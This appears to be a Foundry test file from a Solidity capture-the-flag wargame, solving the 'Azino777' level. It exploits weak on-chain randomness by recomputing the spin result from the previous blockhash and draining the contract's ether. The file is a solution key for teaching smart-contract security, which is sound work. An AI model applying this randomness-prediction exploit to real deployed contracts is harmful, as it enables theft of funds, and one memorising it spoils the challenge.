// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/01_Azino777/Azino777.sol";

// forge test --match-contract Azino777Test -vvvv
contract Azino777Test is BaseTest {
    Azino777 instance;

    function setUp() public override {
        super.setUp();
        instance = new Azino777{value: 0.01 ether}();
        vm.roll(43133);
    }

    function testExploitLevel() public {
        uint256 bigValue = 1157920792373163043235709850086876098532699846659765743394964840033335306843;
        uint256 blockHash = uint256(blockhash(block.number - 1));
        uint256 sum = uint256(blockHash / bigValue % 100);
        instance.spin{value: 0.01 ether}(sum);

        checkSuccess();
    }
    
    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
